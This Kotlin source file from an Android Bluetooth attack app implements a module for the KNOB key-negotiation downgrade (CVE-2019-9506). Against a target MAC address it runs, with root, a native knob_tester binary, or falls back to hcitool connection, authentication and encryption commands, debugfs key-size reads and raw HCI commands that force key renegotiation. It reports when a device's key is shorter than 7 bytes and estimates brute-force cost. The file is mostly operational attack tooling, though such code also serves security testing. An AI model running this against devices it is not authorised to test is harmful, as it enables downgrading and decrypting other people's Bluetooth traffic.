package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Implementation of the KNOB (Key Negotiation of Bluetooth) attack.
 *
 * CVE-2019-9506 exploits a flaw in the Bluetooth BR/EDR encryption key
 * negotiation procedure. The specification allows two devices to negotiate
 * an encryption key as short as 1 byte, making brute-force trivial. An
 * attacker positioned as a man-in-the-middle can manipulate the LMP
 * (Link Manager Protocol) key-size negotiation messages to force both
 * endpoints to agree on a minimal-entropy key.
 *
 * After disclosure, the Bluetooth SIG issued Erratum 11838 mandating a
 * minimum key size of 7 bytes. Devices that still accept keys shorter than
 * 7 bytes are vulnerable to the original attack; devices at exactly 7 bytes
 * meet the post-erratum floor but operate at reduced security.
 *
 * The module first checks for a dedicated native binary (`knob_tester`).
 * If that binary is not present, it falls back to hcitool to create an ACL
 * connection, enable encryption, and read the negotiated key size from the
 * kernel debug filesystem. When the initial negotiation yields a full
 * 16-byte key, a renegotiation attempt is made via an HCI command to test
 * whether the controller enforces the maximum.
 *
 * Root is required for all approaches (HCI access, debugfs reads).
 * All privileged operations are executed through [RootExecutor].
 */
class KnobModule {

    companion object {
        private const val TAG = "KnobModule"
        private const val KNOB_BINARY_PATH = "/data/local/tmp/knob_tester"

        /**
         * Minimum encryption key size mandated by the Bluetooth SIG after the
         * KNOB disclosure (CVE-2019-9506), per Erratum 11838.
         *
         * Keys shorter than this bypass the specification minimum and indicate
         * a successful key-size downgrade.
         *
         * Source: Antonioli et al., "The KNOB is Broken" (USENIX Security 2019).
         */
        private const val MINIMUM_KEY_BYTES = 7
    }

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Executes the KNOB attack workflow against the target device.
     *
     * The flow:
     * 1. Validate MAC address
     * 2. Verify root access (required, no simulation fallback)
     * 3. Check if the native knob_tester binary exists
     * 4. If it exists, run it with the target MAC
     * 5. Otherwise, use hcitool to create an ACL connection and probe key size
     *
     * @param targetDevice The Bluetooth device to test.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting KNOB attack (CVE-2019-9506) on ${targetDevice.name ?: mac}")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("KNOB requires root for HCI access and debugfs reads. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $KNOB_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native knob_tester binary
            emit("Native knob_tester binary found at $KNOB_BINARY_PATH")
            emit("Executing: $KNOB_BINARY_PATH -t $mac")

            val output = RootExecutor.execute("$KNOB_BINARY_PATH -t $mac")
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("knob_tester execution failed.")
            } else {
                emit("knob_tester execution completed.")
            }
        } else {
            // Fallback: use hcitool to probe the connection
            emit("Native binary not found at $KNOB_BINARY_PATH")
            emit("Falling back to hcitool-based key size probing...")

            executeHcitoolApproach(mac)
        }
    }

    /**
     * Uses hcitool to create an ACL connection, attempt authentication and
     * encryption, and then read the negotiated key size from the kernel debug
     * filesystem.
     *
     * If the initial negotiation yields a full 16-byte key, an HCI-level
     * renegotiation command is sent to test whether the controller enforces
     * the maximum or can be forced to accept a shorter key.
     *
     * Key design notes:
     *   - Reads key size from debugfs (no hcitool key_size subcommand exists).
     *   - Uses correct `hcitool enc <bdaddr>` syntax (no trailing keyword).
     *   - Correct threshold tiers per Erratum 11838 and the KNOB paper.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeHcitoolApproach(
        mac: String
    ) {
        // Step 1: Create ACL connection
        emit("Creating ACL connection to $mac...")
        val ccResult = RootExecutor.execute("hcitool cc $mac")
        if (ccResult.startsWith("Error")) {
            emit("Failed to create ACL connection: $ccResult")
            emit("The target may be out of range, unpaired, or not accepting connections.")
            return
        }
        emit("ACL connection result: ${ccResult.ifBlank { "OK (no output = success)" }}")

        // Step 2: Attempt authentication
        emit("Requesting authentication with $mac...")
        val authResult = RootExecutor.execute("hcitool auth $mac")
        if (authResult.startsWith("Error")) {
            emit("Authentication failed: $authResult")
            emit("Continuing to check encryption regardless...")
        } else {
            emit("Authentication result: ${authResult.ifBlank { "OK" }}")
        }

        // Step 3: Enable encryption -- correct BlueZ syntax: `hcitool enc <bdaddr>`
        emit("Enabling encryption on link to $mac...")
        val encResult = RootExecutor.execute("hcitool enc $mac")
        if (encResult.startsWith("Error")) {
            emit("Encryption setup failed: $encResult")
            emit("Cannot determine key size without an encrypted link. Aborting.")
            return
        }
        emit("Encryption result: ${encResult.ifBlank { "OK" }}")

        // Step 4: Read key size from kernel debugfs
        emit("Reading negotiated encryption key size from kernel debug filesystem...")
        val keySizeResult = RootExecutor.execute(
            "cat /sys/kernel/debug/bluetooth/hci0/encryption_key_size 2>/dev/null || " +
            "cat /sys/kernel/debug/bluetooth/hci0/link_key_size 2>/dev/null"
        )

        if (keySizeResult.startsWith("Error") || keySizeResult.isBlank()) {
            emit("Key size check unavailable -- requires kernel debug access (debugfs).")
            emit("Ensure debugfs is mounted: mount -t debugfs none /sys/kernel/debug")
            emit("Encryption is active but key size cannot be verified from this device.")
            return
        }

        // Parse the key size from the output
        val keySizeMatch = Regex("(\\d+)").find(keySizeResult)
        val keySize = keySizeMatch?.groupValues?.get(1)?.toIntOrNull()

        if (keySize == null) {
            emit("Could not parse key size from output. Raw output: $keySizeResult")
            return
        }

        emit("Negotiated key size: $keySize bytes")

        // Step 5: Evaluate the key size
        evaluateKeySize(keySize, mac)

        // Step 6: If full key size, attempt renegotiation to test enforcement
        if (keySize >= 16) {
            attemptKeyRenegotiation(mac)
        }
    }

    /**
     * Evaluates the negotiated key size against known vulnerability thresholds
     * and emits appropriate findings.
     *
     * Threshold tiers (per Bluetooth SIG Erratum 11838 and the KNOB paper):
     *   < 7  bytes: KNOB VULNERABLE -- below BT SIG minimum (post-erratum 11838)
     *   == 7 bytes: At spec minimum -- not a bypass but reduced security
     *   8-15 bytes: Above minimum but below maximum -- reduced security margin
     *   == 16 bytes: Full key size -- not vulnerable to KNOB
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.evaluateKeySize(
        keySize: Int,
        mac: String
    ) {
        when {
            keySize < MINIMUM_KEY_BYTES -> {
                emit("VULNERABILITY CONFIRMED: Key size $keySize bytes is below the " +
                        "Bluetooth SIG minimum of $MINIMUM_KEY_BYTES bytes.")
                emit("The target accepted a key shorter than the post-KNOB specification " +
                        "minimum (Erratum 11838). This indicates a successful key-size " +
                        "downgrade attack (CVE-2019-9506).")
                emit("A $keySize-byte key can be brute-forced in ${bruteForceCost(keySize)}.")
                Log.w(TAG, "KNOB vulnerability confirmed on $mac: key size $keySize bytes")
            }
            keySize == MINIMUM_KEY_BYTES -> {
                emit("Key size is exactly $keySize bytes (the post-erratum specification minimum).")
                emit("Not a KNOB bypass, but operating at the lowest allowed entropy.")
                emit("This meets Erratum 11838 but provides only $keySize bytes of key entropy.")
            }
            keySize < 16 -> {
                emit("Key size $keySize bytes is above the minimum but below the maximum of 16.")
                emit("Reduced security margin. The target negotiated less than maximum entropy.")
                emit("While not a KNOB vulnerability, the controller did not insist on full key size.")
            }
            else -> {
                emit("Key size $keySize bytes. Full encryption key size negotiated.")
                emit("The target is not vulnerable to basic KNOB key-size reduction.")
                emit("Will attempt renegotiation to test enforcement under manipulation...")
            }
        }
    }

    /**
     * Attempts to force key size renegotiation via an HCI command. This tests
     * whether the controller enforces the full key size or can be manipulated
     * into accepting a shorter key on renegotiation.
     *
     * Sends an HCI Set Connection Encryption command to toggle encryption off
     * and back on, then re-reads the key size. In a real KNOB attack, the
     * attacker would inject manipulated LMP_encryption_key_size_req PDUs during
     * the renegotiation; here we test the controller's baseline behavior.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.attemptKeyRenegotiation(
        mac: String
    ) {
        emit("--- Key Renegotiation Test ---")
        emit("Attempting to force key size renegotiation via HCI...")

        // Get the connection handle for the active ACL link
        val conResult = RootExecutor.execute("hcitool con")
        val handleMatch = Regex("handle\\s+(\\d+)").find(conResult)
        val handle = handleMatch?.groupValues?.get(1)

        if (handle == null) {
            emit("Could not determine connection handle from active connections.")
            emit("Raw output: ${conResult.ifBlank { "(empty)" }}")
            emit("Renegotiation test skipped.")
            return
        }
        emit("Connection handle: $handle")

        // Send HCI Set Connection Encryption to disable then re-enable encryption
        // OGF=0x01 (Link Control), OCF=0x0013 (Set_Connection_Encryption)
        // Parameter: connection handle (2 bytes LE) + enable (1 byte)
        val handleHex = handle.toIntOrNull()?.let { String.format("%04x", it) } ?: handle
        val handleLow = handleHex.takeLast(2)
        val handleHigh = handleHex.dropLast(2).takeLast(2).ifEmpty { "00" }

        // Disable encryption
        emit("Disabling encryption on handle $handle...")
        val disableResult = RootExecutor.execute(
            "hcitool cmd 0x01 0x0013 0x$handleLow 0x$handleHigh 0x00"
        )
        emit("Disable encryption result: ${disableResult.ifBlank { "OK" }}")

        // Re-enable encryption (triggers renegotiation)
        emit("Re-enabling encryption (triggering key renegotiation)...")
        val enableResult = RootExecutor.execute(
            "hcitool cmd 0x01 0x0013 0x$handleLow 0x$handleHigh 0x01"
        )
        emit("Re-enable encryption result: ${enableResult.ifBlank { "OK" }}")

        // Re-read key size after renegotiation
        emit("Reading key size after renegotiation...")
        val newKeySizeResult = RootExecutor.execute(
            "cat /sys/kernel/debug/bluetooth/hci0/encryption_key_size 2>/dev/null || " +
            "cat /sys/kernel/debug/bluetooth/hci0/link_key_size 2>/dev/null"
        )

        if (newKeySizeResult.startsWith("Error") || newKeySizeResult.isBlank()) {
            emit("Key size unavailable after renegotiation -- link may have dropped.")
            emit("This can indicate the controller rejected the renegotiation attempt.")
            return
        }

        val newKeySizeMatch = Regex("(\\d+)").find(newKeySizeResult)
        val newKeySize = newKeySizeMatch?.groupValues?.get(1)?.toIntOrNull()

        if (newKeySize != null) {
            emit("Key size after renegotiation: $newKeySize bytes")
            if (newKeySize < MINIMUM_KEY_BYTES) {
                emit("VULNERABILITY CONFIRMED: Renegotiation reduced key to $newKeySize bytes!")
                emit("The controller accepted a sub-minimum key on renegotiation (CVE-2019-9506).")
                Log.w(TAG, "KNOB renegotiation vulnerability on $mac: key dropped to $newKeySize bytes")
            } else if (newKeySize < 16) {
                emit("Key size reduced from 16 to $newKeySize bytes on renegotiation.")
                emit("The controller did not enforce maximum key size during renegotiation.")
            } else {
                emit("Key size remains at $newKeySize bytes after renegotiation.")
                emit("The controller enforces full key size. Not vulnerable to KNOB renegotiation.")
            }
        } else {
            emit("Could not parse key size after renegotiation. Raw output: $newKeySizeResult")
        }
    }

    /**
     * Returns a human-readable estimate of the brute-force cost for a given
     * key size in bytes.
     */
    private fun bruteForceCost(keyBytes: Int): String {
        return when (keyBytes) {
            1 -> "2^8 = 256 attempts (trivial, under 1 second)"
            2 -> "2^16 = 65,536 attempts (trivial, under 1 second)"
            3 -> "2^24 = ~16.7 million attempts (seconds on modern hardware)"
            4 -> "2^32 = ~4.3 billion attempts (minutes on modern hardware)"
            5 -> "2^40 = ~1.1 trillion attempts (hours on modern hardware)"
            6 -> "2^48 = ~281 trillion attempts (days on modern hardware)"
            else -> "2^${keyBytes * 8} attempts"
        }
    }
}
